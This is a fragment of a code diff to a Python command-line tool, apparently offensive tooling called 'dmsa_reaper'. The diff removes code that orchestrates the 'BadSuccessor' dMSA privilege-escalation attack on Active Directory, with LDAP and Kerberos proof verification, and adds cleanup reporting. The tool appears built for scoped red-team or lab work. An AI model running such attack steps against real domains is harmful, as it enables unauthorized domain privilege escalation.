-            _run_campaign_step(
-                steps,
-                "badsuccessor-execute-confirm",
-                lambda: badsuccessor_execute_cmd(
-                    state_path=state_path,
-                    paths_file=paths_path,
-                    expand_targets=profile.expand_targets,
-                    path_id=selected.id,
-                    confirm=True,
-                    confirm_string=confirm_string,
-                    dry_run=False,
-                    scope_file=scope_file,
-                    ops_dir=effective_ops_dir,
-                    allow_broad_dacl=False,
-                    allow_legacy_oneway_link=False,
-                    allow_existing_dmsa_legacy_link=False,
-                    allow_lab_environment=False,
-                    allow_unmapped_target=False,
-                    allow_unmapped_container=False,
-                    allow_unmapped_dmsa=False,
-                    allow_grouped_target_selection=False,
-                    include_sensitive_targets=profile.include_sensitive_targets,
-                    json_out=exec_path,
-                    domain=domain,
-                    dc_ip=dc_ip,
-                    dc_host=dc_host,
-                    username=username,
-                    password=password,
-                    kerberos=kerberos,
-                    use_ldaps=use_ldaps,
-                    target_dn=None,
-                    container_dn=None,
-                    chain=None,
-                    dmsa_name=dmsa_name,
-                ),
-                artifact=exec_path,
-                password=password,
-            )
-            exec_payload = json.loads(exec_path.read_text(encoding="utf-8"))
-            op_id = exec_payload["operation"]["id"]
-            if base_proof_meta is not None:
-                op = load_operation(op_id, ops_dir=effective_ops_dir)
-                record_kerberos_base_check(op, base_proof_meta)
-                save_operation(op, ops_dir=effective_ops_dir)
-                steps.append(campaign_step("kerberos-base-proof-record", "ok"))
-            _run_campaign_step(
-                steps,
-                "verify-ldap",
-                lambda: badsuccessor_verify_cmd(
-                    op_id=op_id or "",
-                    mode="ldap",
-                    evidence_file=None,
-                    ops_dir=effective_ops_dir,
-                    json_output=True,
-                    domain=domain,
-                    dc_ip=dc_ip,
-                    dc_host=dc_host,
-                    username=username,
-                    password=password,
-                    kerberos=kerberos,
-                    use_ldaps=use_ldaps,
-                ),
-                artifact=verify_path,
-                password=password,
-            )
-            verify_payload = operation_lifecycle_summary(load_operation(op_id, ops_dir=effective_ops_dir))
-            _write_json(verify_path, verify_payload)
-            ldap_verified = bool(verify_payload["ldap_verified"])
-
-            if evidence_file:
-                _run_campaign_step(
-                    steps,
-                    "verify-external",
-                    lambda: verify_cmd(
-                        op_id=op_id or "",
-                        mode="external",
-                        json_out=external_path,
-                        external_cmd=None,
-                        external_argv=None,
-                        evidence_file=evidence_file,
-                        kerberos_adapter=None,
-                        adapter_command=None,
-                        adapter_command_file=None,
-                        adapter_dry_run=False,
-                        scope_file=None,
-                        confirm_string=None,
-                        allow_shell_external=False,
-                        store_external_output=False,
-                        ops_dir=effective_ops_dir,
-                        domain=None,
-                        dc_ip=None,
-                        dc_host=None,
-                        username=None,
-                        password=None,
-                        kerberos=False,
-                        use_ldaps=False,
-                    ),
-                    artifact=external_path,
-                    password=password,
-                )
-            else:
-                steps.append(campaign_step("verify-external", "skipped"))
-
-            # dMSA proof verifier runs after LDAP verify so proof is recorded
-            # against the operation's active LDAP state.
-            if dmsa_proof_verifier is not None and ldap_verified:
-                from dmsa_reaper.ops.dmsa_verifier import (
-                    DmsaVerifierError,
-                    run_dmsa_verifier,
-                    validate_verifier_file,
-                )
-                dmsa_proof_path = campaign_dir / "kerberos-dmsa-proof.json"
-                try:
-                    raw_verifier = json.loads(
-                        dmsa_proof_verifier.read_text(encoding="utf-8")
-                    )
-                    vname, vcmd = validate_verifier_file(raw_verifier)
-                    op_for_proof = load_operation(op_id, ops_dir=effective_ops_dir)
-                    vresult = run_dmsa_verifier(
-                        op_for_proof,
-                        vname,
-                        vcmd,
-                        dmsa_proof_path,
-                        dry_run=False,
-                        ops_dir=effective_ops_dir,
-                    )
-                    _write_json(dmsa_proof_path, vresult)
-                    vstep_status = "ok" if vresult.get("proof_valid") else "failed"
-                    steps.append(campaign_step(
-                        "dmsa-proof-verifier",
-                        vstep_status,
-                        artifact=str(dmsa_proof_path),
-                        detail=vresult.get("error"),
-                    ))
-                except (DmsaVerifierError, Exception) as exc:
-                    steps.append(campaign_step(
-                        "dmsa-proof-verifier",
-                        "failed",
-                        detail=_redact_error(str(exc), password),
-                    ))
-            elif dmsa_proof_verifier is not None:
-                steps.append(campaign_step(
-                    "dmsa-proof-verifier",
-                    "skipped",
-                    detail="LDAP verification did not succeed; verifier not executed",
-                ))
-
-            op = load_operation(op_id, ops_dir=effective_ops_dir)
-            report = build_operation_report(op)
-            _write_json(report_path, report)
-            steps.append(campaign_step("report", "ok", artifact=str(report_path)))
-            kerberos_dmsa_verified = bool(report["kerberos_dmsa_verified"])
-            full_success = bool(report["full_badsuccessor_success"])
-    except Exception:
-        failed = True
-        if not op_id:
-            op_id = _latest_campaign_operation_id(effective_ops_dir)
+        operation = cleanup_operation(operation, conn=conn)
+        save_operation(operation)
 
     payload = {
-        "campaign_id": campaign_id,
-        "profile": profile.name,
-        "domain": domain,
-        "dc": dc_ip or dc_host,
-        "artifact_dir": str(campaign_dir),
-        "ops_dir": str(effective_ops_dir),
-        "steps": steps,
-        "operation_id": op_id,
-        "ldap_verified": ldap_verified,
-        "kerberos_base_ready": kerberos_base_ready,
-        "kerberos_dmsa_verified": kerberos_dmsa_verified,
-        "verified_external": kerberos_dmsa_verified,
-        "full_badsuccessor_success": full_success,
-        "final_status": campaign_final_status(
-            ldap_verified=ldap_verified,
-            kerberos_base_ready=kerberos_base_ready,
-            full_success=full_success,
-            failed=failed,
-            dry_run=dry_run or not profile.execute_allowed,
-        ),
-        "secrets_logged": False,
+        "operation_id": operation.id,
+        "status": operation.status,
+        "cleanup_verified": operation.cleanup_verified,
+        "cleanup": operation.metadata.get("cleanup"),
     }
-    _write_json(json_out, payload)
-    typer.echo(json.dumps(payload, indent=2, default=str))
-    if failed:
-        raise typer.Exit(1)
-
-
-@campaign_app.command("status")
-def campaign_status_cmd(
-    campaign_path: Path = typer.Option(..., "--campaign"),
-    json_output: bool = typer.Option(False, "--json"),
-):
-    """Summarize campaign lifecycle state."""
-    payload = json.loads(campaign_path.read_text(encoding="utf-8"))
-    summary = campaign_summary(payload)
-    if json_output:
-        typer.echo(json.dumps(summary, indent=2, default=str))
-    else:
-        print(
-            f"campaign {summary['campaign_id']} final_status={summary['final_status']} "
-            f"ldap_verified={str(summary['ldap_verified']).lower()} "
-            f"kerberos_dmsa_verified={str(summary['kerberos_dmsa_verified']).lower()}"
-        )
-
-
-@campaign_app.command("report")
-def campaign_report_cmd(
-    campaign_path: Path = typer.Option(..., "--campaign"),
-    output_format: str = typer.Option("json", "--format", help="json | markdown"),
-    out: Optional[Path] = typer.Option(None, "--out"),
-):
-    """Render a campaign report without secrets."""
-    payload = json.loads(campaign_path.read_text(encoding="utf-8"))
-    if output_format == "json":
-        rendered = json.dumps(payload, indent=2, default=str)
-    elif output_format == "markdown":
-        rendered = campaign_markdown(payload)
-    else:
-        raise typer.BadParameter("--format must be 'json' or 'markdown'")
-    if out:
-        out.write_text(rendered, encoding="utf-8")
-    else:
-        typer.echo(rendered)
-
-
-@graph_app.command("export")
-def graph_export_cmd(
-    state_path: Path = typer.Option(Path("state.json"), "--state"),
-    paths_file: Optional[Path] = typer.Option(None, "--paths"),
-    output_format: str = typer.Option("bloodhound-legacy", "--format"),
-    out: Path = typer.Option(..., "--out"),
-):
-    """Export non-secret graph metadata for external analysis."""
-    from devtools.graph import export_graph
-
-    state, paths = _load_paths_for_state(
-        state_path,
-        paths_file,
-        expand_targets=True,
-        only=None,
-        include_sensitive_targets=True,
-    )
-    exported = export_graph(state, paths, output_format)
-    if isinstance(exported, str):
-        out.write_text(exported, encoding="utf-8")
-    else:
-        _write_json(out, exported)
-    print(f"[green]wrote graph export[/green] {out}")
-
-
-@proof_app.command("collect-base")
-def proof_collect_base_cmd(
-    ccache: Path = typer.Option(..., "--ccache"),
-    json_out: Path = typer.Option(..., "--json"),
-    krb5_config: Optional[Path] = typer.Option(None, "--krb5-config"),
-    dc_host: Optional[str] = typer.Option(None, "--dc-host"),
-    service: Optional[str] = typer.Option(None, "--service"),
-):
-    """Collect Kerberos base-readiness proof metadata from a ccache."""
-    try:
-        proof = collect_base_proof_from_klist(
-            ccache=ccache,
-            service=service,
-            krb5_config=krb5_config,
-            dc_host=dc_host,
-        )
-    except ProofCollectionError as exc:
-        raise typer.BadParameter(str(exc)) from exc
-    secret_findings = find_secret_material(proof)
-    if secret_findings:
-        raise typer.BadParameter("; ".join(secret_findings))
-    _write_json(json_out, proof)
-    typer.echo(json.dumps(proof, indent=2, default=str))
-
-
-@proof_app.command("validate")
-def proof_validate_cmd(
-    op_id: Optional[str] = typer.Option(None, "--op"),
-    evidence_file: Path = typer.Option(..., "--evidence-file"),
-    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
-):
-    """Validate structured proof against an operation without mutating the log."""
-    evidence, digest = load_evidence_file(evidence_file)
-    try:
-        if op_id:
-            configure_ops_dir(ops_dir)
-            op = load_operation(op_id)
-            proof = validate_kerberos_evidence(op, evidence, digest)
-        else:
-            if evidence.get("type") != BASE_PROOF_TYPE:
-                raise ExternalProofError("--op is required for operation-bound dMSA proof")
-            proof = validate_kerberos_base_evidence_for_operation(None, evidence, digest)
-    except ExternalProofError as exc:
-        raise typer.BadParameter(str(exc)) from exc
-    typer.echo(json.dumps({
-        "type": "proof-validation",
-        "ok": proof.get("ok") is True,
-        "valid": proof.get("ok") is True,
-        "proof_type": proof.get("type"),
-        "proof": proof,
-        "mutated_operation_log": False,
-    }, indent=2, default=str))
-
-
-@proof_app.command("run-dmsa-verifier")
-def proof_run_dmsa_verifier_cmd(
-    op_id: str = typer.Option(..., "--op", help="Operation ID (OP-...)."),
-    verifier_command_file: Path = typer.Option(
-        ...,
-        "--verifier-command-file",
-        help="JSON file with verifier 'name' and 'command' argv template.",
-    ),
-    output_proof: Path = typer.Option(
-        ...,
-        "--output-proof",
-        help="Path where the verifier will write the proof JSON file.",
-    ),
-    dry_run: bool = typer.Option(
-        False,
-        "--dry-run",
-        help="Render the command and validate the file without executing.",
-    ),
-    skip_ldap_check: bool = typer.Option(
-        False,
-        "--skip-ldap-check",
-        help="Allow verifier run even if LDAP verification has not succeeded.",
-    ),
-    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
-    json_out: Optional[Path] = typer.Option(None, "--json"),
-):
-    """Run an external dMSA Kerberos proof verifier and record the structured result.
-
-    The verifier command file must be a JSON object with:
-      ``name``    — verifier identifier string.
-      ``command`` — argv list with optional {var} placeholders.
-
-    Allowed template variables: operation_id, domain, realm, target_dn,
-    target_sam, created_dmsa_dn, created_dmsa_sam, output_proof.
-
-    The verifier must write a kerberos-dmsa-proof JSON to --output-proof.
-    Only proof metadata is stored; raw stdout/stderr and ticket bytes are never logged.
-    """
-    from dmsa_reaper.ops.dmsa_verifier import (
-        DmsaVerifierError,
-        run_dmsa_verifier,
-        validate_verifier_file,
-    )
-
-    configure_ops_dir(ops_dir)
-    op = load_operation(op_id)
-
-    if not skip_ldap_check and not op.verified_ldap:
-        raise typer.BadParameter(
-            "operation LDAP verification has not succeeded — "
-            "run 'verify --mode ldap' first, or pass --skip-ldap-check for a lab override."
-        )
-
-    raw = json.loads(verifier_command_file.read_text(encoding="utf-8"))
-    try:
-        name, command_template = validate_verifier_file(raw)
-    except DmsaVerifierError as exc:
-        raise typer.BadParameter(str(exc)) from exc
-
-    try:
-        result = run_dmsa_verifier(
-            op,
-            name,
-            command_template,
-            output_proof,
-            dry_run=dry_run,
-            ops_dir=ops_dir,
-        )
-    except DmsaVerifierError as exc:
-        raise typer.BadParameter(str(exc)) from exc
-
-    output = {
-        "operation_id": op_id,
-        "verifier": name,
-        "result": result,
-    }
+    cleanup_artifact = get_ops_dir().parent / "runs" / operation.id / "cleanup.json"
+    _write_json(cleanup_artifact, payload)
+    cleanup_artifact.chmod(0o600)
     if json_out:
-        _write_json(json_out, output)
-        print(f"[green]wrote verifier result[/green] {json_out}")
-
-    if dry_run:
-        print(f"[dry-run] verifier={name} rendered_argv_sha256={result['rendered_argv_sha256']}")
-        return
-
-    if result["proof_valid"]:
-        print(f"[green]dMSA Kerberos proof verified[/green] operation={op_id} verifier={name}")
-        print(f"proof_sha256={result['proof_sha256']}")
-        print("kerberos_dmsa_verified=true full_badsuccessor_success=true")
-    else:
-        print(f"[yellow]dMSA Kerberos proof FAILED[/yellow] operation={op_id} verifier={name}")
-        print(f"error={result.get('error')}")
-        print("kerberos_dmsa_verified=false")
-
-
-def lab_check_cmd(
-    contract_path: Path = typer.Option(..., "--contract"),
-    state_path: Path = typer.Option(Path("state.json"), "--state"),
-    paths_file: Optional[Path] = typer.Option(None, "--paths"),
-    json_output: bool = typer.Option(False, "--json"),
-):
-    """Validate map/path output against an ADBuilder contract."""
-    from devtools.lab_check import validate_lab_contract
-
-    contract = json.loads(contract_path.read_text(encoding="utf-8"))
-    state, paths = _load_paths_for_state(
-        state_path,
-        paths_file,
-        expand_targets=True,
-        only=None,
-        include_sensitive_targets=True,
+        _write_json(json_out, payload)
+    cleanup = operation.metadata.get("cleanup") or {}
+    for conflict in cleanup.get("conflicts", []):
+        print(f"[red][-] {conflict.get('dn')}: {conflict.get('reason')}[/red]")
+    for error in cleanup.get("errors", []):
+        print(f"[red][-] {error.get('dn')}: {error.get('reason')}[/red]")
+    print(
+        f"[green][+] Cleanup:[/green] {operation.status} "
+        f"(checked={str(operation.cleanup_verified).lower()})"
     )
-    result = validate_lab_contract(contract, state, paths)
-    if json_output:
-        typer.echo(json.dumps(result, indent=2, default=str))
-    else:
-        for check in result["checks"]:
-            print(f"{'ok' if check['ok'] else 'fail'} {check['name']}: {check['detail']}")
-        if not result["ok"]:
-            raise typer.Exit(1)
-
-
-@app.command("report")
-def report_cmd(
-    op_id: Optional[str] = typer.Option(None, "--op"),
-    campaign_path: Optional[Path] = typer.Option(None, "--campaign"),
-    output_format: str = typer.Option("json", "--format", help="json | markdown"),
-    out: Optional[Path] = typer.Option(None, "--out"),
-    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
-):
-    """Emit a defensive-quality operation or campaign report without secrets."""
-    if campaign_path:
-        payload = json.loads(campaign_path.read_text(encoding="utf-8"))
-        if output_format == "json":
-            rendered = json.dumps(payload, indent=2, default=str)
-        elif output_format == "markdown":
-            rendered = campaign_markdown(payload)
-        else:
-            raise typer.BadParameter("--format must be 'json' or 'markdown'")
-        if out:
-            out.write_text(rendered, encoding="utf-8")
-        else:
-            typer.echo(rendered)
-        return
-    if not op_id:
-        raise typer.BadParameter("--op or --campaign is required")
-    configure_ops_dir(ops_dir)
-    op = load_operation(op_id)
-    report = build_operation_report(op)
-    if output_format == "json":
-        rendered = json.dumps(report, indent=2, default=str)
-    elif output_format == "markdown":
-        rendered = operation_report_markdown(report)
-    else:
-        raise typer.BadParameter("--format must be 'json' or 'markdown'")
-    if out:
-        out.write_text(rendered, encoding="utf-8")
-    else:
-        typer.echo(rendered)
+    if not operation.cleanup_verified:
+        raise typer.Exit(code=1)
 
 
 if __name__ == "__main__":
